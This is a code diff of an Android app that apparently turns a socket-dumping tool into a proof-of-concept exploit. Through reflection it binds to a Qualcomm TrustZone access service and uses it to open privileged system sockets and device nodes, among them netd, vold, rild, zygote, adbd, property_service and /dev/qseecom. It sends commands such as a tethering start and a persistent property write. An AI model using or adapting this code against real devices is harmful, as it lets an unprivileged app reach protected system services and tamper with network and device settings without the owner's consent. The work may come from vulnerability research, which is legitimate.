@@ -11,7 +11,6 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.ParcelFileDescriptor;
-import android.os.RemoteException;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -21,17 +20,13 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
-import java.io.IOException;
 import java.lang.reflect.Method;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
@@ -44,14 +39,14 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
-    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
-    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
+    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
+    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
-    private IMinkSocketFd mTZService;
+    private Object tzService;
     private boolean isBound = false;
     private AtomicBoolean isTesting = new AtomicBoolean(false);
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
@@ -61,26 +56,34 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    public static native ParcelFileDescriptor nativeConnectSocket(IMinkSocketFd tzService, String path, int[] handleArr);
+    public static native String[] nativeListDir(String path);
     public static native String nativeReadFile(String path);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
-            mTZService = IMinkSocketFd.Stub.asInterface(service);
-            appendLog("[TZ] Service bound");
-            updateStatus("Bound - starting dump");
-            enableButtons(false, true);
-            stopRequested.set(false);
-            testThread = new Thread(() -> executeDump());
-            testThread.start();
+            try {
+                Class<?> stubClass = Class.forName("com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd$Stub");
+                Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
+                tzService = asInterface.invoke(null, service);
+                appendLog("[TZ] Service bound");
+                updateStatus("Bound - starting exploit");
+                enableButtons(false, true);
+                stopRequested.set(false);
+                testThread = new Thread(() -> executeExploit());
+                testThread.start();
+            } catch (Exception e) {
+                appendLog("[TZ] asInterface error: " + e.toString());
+                enableButtons(true, false);
+            }
         }
+
         @Override
         public void onServiceDisconnected(ComponentName name) {
-            mTZService = null;
+            tzService = null;
             isBound = false;
             enableButtons(true, false);
-            updateStatus("TZ disconnected");
+            updateStatus("Disconnected");
         }
     };
 
@@ -137,7 +140,7 @@ public class MainActivity extends AppCompatActivity {
     private void bindService() {
         try {
             Intent intent = new Intent();
-            intent.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
+            intent.setClassName(TARGET_PKG, TARGET_CLS);
             boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
             if (ret) {
                 appendLog("Binding service...");
@@ -164,26 +167,67 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void executeDump() {
+    private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== Socket Information Dump ==========");
+        appendLog("========== Advanced TZ POC ==========");
 
-        // 各ソケットと送信データ（プロトコル別）
-        dumpFwmarkd();
-        dumpDnsProxyd();
-        dumpMdnsd();
-        dumpLogd();
-        dumpNetd();
-        dumpGeneric("/dev/socket/tcm", new String[]{"help\n", "status\n", "version\n"});
-        dumpGeneric("/dev/socket/location", new String[]{"help\n", "status\n", "version\n"});
+        // 1. Enumerate /dev/socket
+        String[] sockets = nativeListDir("/dev/socket");
+        if (sockets == null) sockets = new String[0];
+        appendLog("[*] Found " + sockets.length + " sockets");
 
-        appendLog("========== System Properties Dump ==========");
-        dumpSystemProperties();
+        // 2. High-value targets including /dev/qseecom
+        String[] knownTargets = {
+                "/dev/socket/netd",
+                "/dev/socket/dnsproxyd",
+                "/dev/socket/fwmarkd",
+                "/dev/socket/mdnsd",
+                "/dev/socket/logd",
+                "/dev/socket/property_service",
+                "/dev/socket/vold",
+                "/dev/socket/wpa_ctrl_0",
+                "/dev/socket/rild",
+                "/dev/socket/ppp",
+                "/dev/socket/qmux_radio",
+                "/dev/socket/qmux_audio",
+                "/dev/socket/qmux_bluetooth",
+                "/dev/socket/qmux_gps",
+                "/dev/socket/tcm",
+                "/dev/socket/location",
+                "/dev/socket/zygote",
+                "/dev/socket/adbd",
+                "/dev/qseecom",
+                "/dev/ion",
+                "/dev/ashmem",
+                "/dev/kgsl-3d0"
+        };
 
-        appendLog("========== /proc Info Dump ==========");
-        dumpProcFiles();
+        List<String> allTargets = new ArrayList<>();
+        for (String s : knownTargets) allTargets.add(s);
+        for (String s : sockets) {
+            String full = "/dev/socket/" + s;
+            if (!allTargets.contains(full)) allTargets.add(full);
+        }
 
-        appendLog("========== DUMP COMPLETED ==========");
+        // 3. Test each target
+        for (String path : allTargets) {
+            if (stopRequested.get()) break;
+            appendLog("[+] Testing " + path);
+            try {
+                testSocket(path);
+            } catch (Exception e) {
+                appendLog("[!] Error testing " + path + ": " + e.getMessage());
+            }
+        }
+
+        // 4. Additional info gathering
+        appendLog("[*] Trying property read/write");
+        tryPropertySet();
+
+        appendLog("[*] Reading /proc/self/fd");
+        tryReadProcFd();
+
+        appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
         updateStatus("Done");
         isTesting.set(false);
@@ -192,305 +236,237 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    // ===== fwmarkd 専用 (バイナリプロトコル) =====
-    private void dumpFwmarkd() {
-        appendLog("[FW] Dumping fwmarkd");
+    private void testSocket(String path) throws Exception {
         ParcelFileDescriptor pfd = null;
         try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a("/dev/socket/fwmarkd", iArr);
+            int[] handle = new int[1];
+            pfd = openSocket(path, handle);
             if (pfd == null) {
-                appendLog("[FW] Failed to open");
+                appendLog("[ ] Failed to open " + path);
                 return;
             }
-            java.io.FileDescriptor fd = pfd.getFileDescriptor();
+            FileDescriptor fd = pfd.getFileDescriptor();
             if (fd == null || !fd.valid()) {
-                appendLog("[FW] Invalid FD");
+                appendLog("[ ] Invalid FD for " + path);
                 pfd.close();
                 return;
             }
+            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");
 
-            // SELECT_NETWORK (cmd=6), uid=自身, netId=0, trafficCtrlInfo=0
-            ByteBuffer buf = ByteBuffer.allocate(16);
-            buf.order(ByteOrder.LITTLE_ENDIAN);
-            buf.putInt(6);          // cmdId
-            buf.putInt(android.os.Process.myUid()); // uid
-            buf.putInt(0);          // netId
-            buf.putInt(0);          // trafficCtrlInfo
-
-            OutputStream os = new FileOutputStream(fd);
-            os.write(buf.array());
-            os.flush();
-
-            // 応答は4バイトのエラーコード (int)
-            InputStream is = new FileInputStream(fd);
-            byte[] resp = new byte[4];
-            int read = readBytes(is, resp, 4, 1000);
-            if (read == 4) {
-                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
-                appendLog("[FW] SELECT_NETWORK response: " + result + " (0=success)");
-            } else {
-                appendLog("[FW] No response or incomplete");
-            }
-
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[FW] Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    // ===== dnsproxyd 専用 (DNSクエリ) =====
-    private void dumpDnsProxyd() {
-        appendLog("[DNS] Dumping dnsproxyd");
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a("/dev/socket/dnsproxyd", iArr);
-            if (pfd == null) {
-                appendLog("[DNS] Failed to open");
-                return;
-            }
-            java.io.FileDescriptor fd = pfd.getFileDescriptor();
-            if (fd == null || !fd.valid()) {
-                appendLog("[DNS] Invalid FD");
-                pfd.close();
-                return;
-            }
-
-            // DNSクエリ: localhost Aレコード (RFC 1035)
-            byte[] query = buildDnsQuery("localhost", 1); // TYPE A
-            OutputStream os = new FileOutputStream(fd);
-            os.write(query);
-            os.flush();
-
-            InputStream is = new FileInputStream(fd);
-            byte[] resp = new byte[512];
-            int read = readBytes(is, resp, 512, 2000);
-            if (read > 0) {
-                appendLog("[DNS] Response (" + read + " bytes): " + bytesToHex(resp, read));
-                // 簡易パース: ヘッダーから応答コードを抽出
-                int rcode = resp[3] & 0x0F;
-                appendLog("[DNS] RCODE: " + rcode + " (0=no error)");
-            } else {
-                appendLog("[DNS] No response");
-            }
-
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[DNS] Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    /**
-     * DNSクエリ（RFC 1035）を構築する。
-     * @throws IOException ByteArrayOutputStreamのwriteで発生する可能性（実際には発生しないが、シグネチャに宣言）
-     */
-    private byte[] buildDnsQuery(String name, int qtype) throws IOException {
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        // ヘッダー (12 bytes): ID=0x1234, QR=0, Opcode=0, AA=0, TC=0, RD=1, RA=0, Z=0, RCODE=0, QDCOUNT=1
-        baos.write(0x12); baos.write(0x34); // ID
-        baos.write(0x01); baos.write(0x00); // flags: RD=1
-        baos.write(0x00); baos.write(0x01); // QDCOUNT=1
-        baos.write(0x00); baos.write(0x00); // ANCOUNT=0
-        baos.write(0x00); baos.write(0x00); // NSCOUNT=0
-        baos.write(0x00); baos.write(0x00); // ARCOUNT=0
-
-        // QNAME: ラベルエンコード
-        for (String label : name.split("\\.")) {
-            baos.write(label.length());
-            baos.write(label.getBytes(StandardCharsets.US_ASCII));
-        }
-        baos.write(0); // 終端
-
-        // QTYPE (2 bytes) and QCLASS (2 bytes)
-        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
-        baos.write(0x00); baos.write(0x01); // IN
-
-        return baos.toByteArray();
-    }
-
-    // ===== mdnsd 専用 (mDNSクエリ) =====
-    private void dumpMdnsd() {
-        appendLog("[MDNS] Dumping mdnsd");
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a("/dev/socket/mdnsd", iArr);
-            if (pfd == null) {
-                appendLog("[MDNS] Failed to open");
-                return;
-            }
-            java.io.FileDescriptor fd = pfd.getFileDescriptor();
-            if (fd == null || !fd.valid()) {
-                appendLog("[MDNS] Invalid FD");
-                pfd.close();
-                return;
-            }
-
-            // mDNSクエリ: localhost.local (mDNS uses .local)
-            byte[] query = buildDnsQuery("localhost.local", 1);
-            OutputStream os = new FileOutputStream(fd);
-            os.write(query);
-            os.flush();
-
-            InputStream is = new FileInputStream(fd);
-            byte[] resp = new byte[512];
-            int read = readBytes(is, resp, 512, 2000);
-            if (read > 0) {
-                appendLog("[MDNS] Response (" + read + " bytes): " + bytesToHex(resp, read));
-            } else {
-                appendLog("[MDNS] No response");
-            }
-
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[MDNS] Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    // ===== logd 専用 (読み取り試行) =====
-    private void dumpLogd() {
-        appendLog("[LOGD] Dumping logd (attempt read)");
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a("/dev/socket/logd", iArr);
-            if (pfd == null) {
-                appendLog("[LOGD] Failed to open");
-                return;
-            }
-            java.io.FileDescriptor fd = pfd.getFileDescriptor();
-            if (fd == null || !fd.valid()) {
-                appendLog("[LOGD] Invalid FD");
-                pfd.close();
-                return;
-            }
-
-            // 何も送信せずに読み取りを試行 (サーバーからデータが来るかも)
-            InputStream is = new FileInputStream(fd);
-            byte[] buf = new byte[4096];
-            int read = readBytes(is, buf, 4096, 1000);
-            if (read > 0) {
-                appendLog("[LOGD] Read " + read + " bytes: " + new String(buf, 0, read, StandardCharsets.UTF_8));
-            } else {
-                appendLog("[LOGD] No data (maybe need to send log message first)");
-            }
-
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[LOGD] Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    // ===== netd 専用 (テキストコマンド) =====
-    private void dumpNetd() {
-        dumpGeneric("/dev/socket/netd", new String[]{"help\n", "status\n", "version\n", "interface list\n"});
-    }
-
-    // ===== 汎用テキストコマンド =====
-    private void dumpGeneric(String path, String[] commands) {
-        appendLog("[GEN] Dumping " + path);
-        ParcelFileDescriptor pfd = null;
-        try {
-            int[] iArr = new int[1];
-            pfd = mTZService.a(path, iArr);
-            if (pfd == null) {
-                appendLog("[GEN] Failed to open " + path);
-                return;
-            }
-            java.io.FileDescriptor fd = pfd.getFileDescriptor();
-            if (fd == null || !fd.valid()) {
-                appendLog("[GEN] Invalid FD");
-                pfd.close();
-                return;
-            }
-
-            OutputStream os = new FileOutputStream(fd);
-            InputStream is = new FileInputStream(fd);
-
-            for (String cmd : commands) {
-                if (stopRequested.get()) break;
-                appendLog("[GEN] CMD: " + cmd.trim());
-                try {
-                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    byte[] buf = new byte[2048];
-                    int read = readBytes(is, buf, 2048, 1000);
-                    if (read > 0) {
-                        String resp = new String(buf, 0, read, StandardCharsets.UTF_8);
-                        appendLog("[GEN] Response: " + resp.replace("\n", "\\n").replace("\r", "\\r"));
-                    } else {
-                        appendLog("[GEN] No response");
-                    }
-                } catch (Exception e) {
-                    appendLog("[GEN] CMD error: " + e.getMessage());
+            // If it's a socket, try to interact; if it's a device file, just read.
+            if (path.startsWith("/dev/socket/")) {
+                String base = new File(path).getName();
+                switch (base) {
+                    case "netd": testNetd(fd); break;
+                    case "dnsproxyd": testDnsProxy(fd); break;
+                    case "fwmarkd": testFwmarkd(fd); break;
+                    case "mdnsd": testMdnsd(fd); break;
+                    case "logd": testLogd(fd); break;
+                    case "property_service": testPropertyService(fd); break;
+                    case "wpa_ctrl_0": testWpaCtrl(fd); break;
+                    case "rild": testRild(fd); break;
+                    case "vold": testVold(fd); break;
+                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n"});
                 }
-                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
-            }
-
-            os.close();
-            is.close();
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[GEN] Error: " + e.getMessage());
-            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
-        }
-    }
-
-    // ===== システムプロパティ =====
-    private void dumpSystemProperties() {
-        try {
-            Class<?> spClass = Class.forName("android.os.SystemProperties");
-            Method getMethod = spClass.getMethod("get", String.class);
-            String[] props = {
-                "ro.build.version.release", "ro.product.model", "ro.product.manufacturer",
-                "ro.build.date", "persist.sys.timezone", "persist.sys.language",
-                "persist.sys.country", "sys.retaildemo.enabled", "ro.boot.hardware",
-                "ro.boot.serialno", "ro.build.display.id", "ro.build.version.sdk"
-            };
-            for (String prop : props) {
-                if (stopRequested.get()) break;
-                String value = (String) getMethod.invoke(null, prop);
-                appendLog("[PROP] " + prop + " = " + (value != null ? value : "(null)"));
-            }
-        } catch (Exception e) {
-            appendLog("[PROP] Reflection error: " + e.getMessage());
-        }
-    }
-
-    // ===== /proc ファイル =====
-    private void dumpProcFiles() {
-        String[] files = {
-            "/proc/version", "/proc/self/status", "/proc/self/cmdline",
-            "/proc/meminfo", "/proc/cpuinfo", "/proc/uptime", "/proc/loadavg"
-        };
-        for (String f : files) {
-            if (stopRequested.get()) break;
-            try {
-                String content = nativeReadFile(f);
-                if (content != null && !content.isEmpty()) {
-                    appendLog("[PROC] " + f + ":\n" + content);
+            } else {
+                // Device file: read first few bytes
+                InputStream is = new FileInputStream(fd);
+                byte[] buf = new byte[64];
+                int read = readBytes(is, buf, 64, 500);
+                if (read > 0) {
+                    appendLog("[DEV] Read " + read + " bytes from " + path + ": " + bytesToHex(buf, read));
                 } else {
-                    appendLog("[PROC] " + f + " -> (empty or inaccessible)");
+                    appendLog("[DEV] No data from " + path);
                 }
-            } catch (Exception e) {
-                appendLog("[PROC] " + f + " error: " + e.getMessage());
+                is.close();
             }
+            pfd.close();
+        } catch (Exception e) {
+            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
         }
     }
 
-    // ===== ヘルパー: タイムアウト付きバイト読み取り =====
+    private ParcelFileDescriptor openSocket(String path, int[] handle) throws Exception {
+        if (tzService == null) return null;
+        Class<?> cls = tzService.getClass();
+        Method m = cls.getMethod("a", String.class, int[].class);
+        return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
+    }
+
+    private void testNetd(FileDescriptor fd) throws Exception {
+        appendLog("[NETD] Testing netd commands");
+        String[] cmds = {"help\n", "version\n", "interface list\n", "route list\n", "tether start 192.168.1.1 192.168.1.10\n", "dns resolver getservers\n"};
+        for (String cmd : cmds) {
+            if (stopRequested.get()) break;
+            String resp = sendTextCommand(fd, cmd, 2000);
+            appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+        }
+    }
+
+    private void testDnsProxy(FileDescriptor fd) throws Exception {
+        appendLog("[DNS] Sending DNS query for localhost");
+        byte[] query = buildDnsQuery("localhost", 1);
+        byte[] resp = sendBinary(fd, query, 512, 2000);
+        if (resp != null && resp.length > 0) {
+            int rcode = resp[3] & 0x0F;
+            appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
+        } else {
+            appendLog("[DNS] No response");
+        }
+    }
+
+    private void testFwmarkd(FileDescriptor fd) throws Exception {
+        appendLog("[FW] Sending SELECT_NETWORK");
+        ByteBuffer buf = ByteBuffer.allocate(16);
+        buf.order(ByteOrder.LITTLE_ENDIAN);
+        buf.putInt(6);
+        buf.putInt(android.os.Process.myUid());
+        buf.putInt(0);
+        buf.putInt(0);
+        byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
+        if (resp != null && resp.length == 4) {
+            int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+            appendLog("[FW] SELECT_NETWORK result=" + result);
+        } else {
+            appendLog("[FW] No/invalid response");
+        }
+    }
+
+    private void testMdnsd(FileDescriptor fd) throws Exception {
+        appendLog("[MDNS] Sending mDNS query");
+        byte[] query = buildDnsQuery("localhost.local", 1);
+        byte[] resp = sendBinary(fd, query, 512, 2000);
+        if (resp != null && resp.length > 0) {
+            appendLog("[MDNS] Response len=" + resp.length);
+        } else {
+            appendLog("[MDNS] No response");
+        }
+    }
+
+    private void testLogd(FileDescriptor fd) throws Exception {
+        appendLog("[LOGD] Reading logd (no command)");
+        InputStream is = new FileInputStream(fd);
+        byte[] buf = new byte[4096];
+        int read = readBytes(is, buf, 4096, 1000);
+        if (read > 0) {
+            String str = new String(buf, 0, read, StandardCharsets.UTF_8);
+            appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
+        } else {
+            appendLog("[LOGD] No data");
+        }
+        is.close();
+    }
+
+    private void testPropertyService(FileDescriptor fd) throws Exception {
+        appendLog("[PROP] Sending get command");
+        String resp = sendTextCommand(fd, "get ro.build.version.release\n", 1000);
+        appendLog("[PROP] get response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+    }
+
+    private void tryPropertySet() {
+        try {
+            int[] handle = new int[1];
+            ParcelFileDescriptor pfd = openSocket("/dev/socket/property_service", handle);
+            if (pfd == null) {
+                appendLog("[PROP] Cannot open property_service");
+                return;
+            }
+            FileDescriptor fd = pfd.getFileDescriptor();
+            if (fd == null || !fd.valid()) {
+                appendLog("[PROP] Invalid FD");
+                pfd.close();
+                return;
+            }
+            String cmd = "set persist.test.poc 1\n";
+            String resp = sendTextCommand(fd, cmd, 500);
+            appendLog("[PROP] set command response: " + (resp != null ? resp : "(none)"));
+            pfd.close();
+        } catch (Exception e) {
+            appendLog("[PROP] Exception: " + e.getMessage());
+        }
+    }
+
+    private void testWpaCtrl(FileDescriptor fd) throws Exception {
+        appendLog("[WPA] Sending STATUS");
+        String resp = sendTextCommand(fd, "STATUS\n", 1000);
+        appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+    }
+
+    private void testRild(FileDescriptor fd) throws Exception {
+        appendLog("[RILD] Sending AT+CGMI");
+        byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
+        byte[] resp = sendBinary(fd, at, 256, 1500);
+        if (resp != null) {
+            appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
+        } else {
+            appendLog("[RILD] No response");
+        }
+    }
+
+    private void testVold(FileDescriptor fd) throws Exception {
+        appendLog("[VOLD] Sending status");
+        String resp = sendTextCommand(fd, "status\n", 1000);
+        appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+    }
+
+    private void testGeneric(FileDescriptor fd, String[] cmds) throws Exception {
+        for (String cmd : cmds) {
+            if (stopRequested.get()) break;
+            String resp = sendTextCommand(fd, cmd, 1000);
+            appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+        }
+    }
+
+    private void tryReadProcFd() {
+        appendLog("[PROC] Reading /proc/self/fd");
+        String[] fds = nativeListDir("/proc/self/fd");
+        if (fds == null) {
+            appendLog("[PROC] Could not read fd directory");
+            return;
+        }
+        for (String fd : fds) {
+            if (stopRequested.get()) break;
+            String link = "/proc/self/fd/" + fd;
+            String target = nativeReadFile(link); // actually readlink, but nativeReadFile reads content; we'll try to read the link target by reading it as file (might fail)
+            appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
+        }
+    }
+
+    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
+        OutputStream os = new FileOutputStream(fd);
+        os.write(cmd.getBytes(StandardCharsets.UTF_8));
+        os.flush();
+        os.close();
+
+        InputStream is = new FileInputStream(fd);
+        byte[] buf = new byte[4096];
+        int read = readBytes(is, buf, 4096, timeoutMs);
+        is.close();
+        if (read > 0) {
+            return new String(buf, 0, read, StandardCharsets.UTF_8);
+        }
+        return null;
+    }
+
+    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
+        OutputStream os = new FileOutputStream(fd);
+        os.write(data);
+        os.flush();
+        os.close();
+
+        InputStream is = new FileInputStream(fd);
+        byte[] buf = new byte[maxResp];
+        int read = readBytes(is, buf, maxResp, timeoutMs);
+        is.close();
+        if (read > 0) {
+            byte[] resp = new byte[read];
+            System.arraycopy(buf, 0, resp, 0, read);
+            return resp;
+        }
+        return null;
+    }
+
     private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
         int total = 0;
         long start = System.currentTimeMillis();
@@ -510,6 +486,24 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
+        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+        baos.write(0x12); baos.write(0x34);
+        baos.write(0x01); baos.write(0x00);
+        baos.write(0x00); baos.write(0x01);
+        baos.write(0x00); baos.write(0x00);
+        baos.write(0x00); baos.write(0x00);
+        baos.write(0x00); baos.write(0x00);
+        for (String label : name.split("\\.")) {
+            baos.write(label.length());
+            baos.write(label.getBytes(StandardCharsets.US_ASCII));
+        }
+        baos.write(0);
+        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
+        baos.write(0x00); baos.write(0x01);
+        return baos.toByteArray();
+    }
+
     private String bytesToHex(byte[] bytes, int len) {
         StringBuilder sb = new StringBuilder();
         for (int i = 0; i < len && i < 64; i++) {
@@ -519,7 +513,6 @@ public class MainActivity extends AppCompatActivity {
         return sb.toString();
     }
 
-    // ===== UIログ =====
     private void appendLog(final String msg) {
         String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
         final String line = "[" + ts + "] " + msg + "\n";
@@ -544,9 +537,9 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("Cannot create Download dir");
                 return;
             }
-            File file = new File(dir, "socket_dump_log.txt");
+            File file = new File(dir, "tz_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Socket Dump Log ===");
+                pw.println("=== TZ POC Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
@@ -560,11 +553,11 @@ public class MainActivity extends AppCompatActivity {
 
     private void finishTest() {
         handler.post(() -> {
-            Toast.makeText(MainActivity.this, "Dump completed", Toast.LENGTH_LONG).show();
+            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 finishAffinity();
                 System.exit(0);
-            }, 2000);
+            }, 3000);
         });
     }
 
